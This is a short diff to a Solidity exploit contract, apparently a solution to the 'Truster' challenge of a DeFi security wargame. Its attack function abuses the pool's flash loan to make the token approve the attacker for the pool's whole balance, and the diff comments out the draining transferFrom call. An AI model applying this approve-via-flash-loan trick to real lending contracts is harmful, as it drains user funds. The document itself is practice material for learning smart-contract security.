@@ -16,7 +16,8 @@ contract TrusterAttacker {
     function attack() external {
         uint256 poolBalance = damnValuableToken.balanceOf(address(pool));
         pool.flashLoan(0, address(this), address(damnValuableToken), abi.encodeWithSignature("approve(address,uint256)", msg.sender, poolBalance));
-        damnValuableToken.transferFrom(address(pool), msg.sender, poolBalance);
+        // somehow this doesn't work anymore...
+        // damnValuableToken.transferFrom(address(pool), msg.sender, poolBalance);
     }
 
     receive () external payable {}
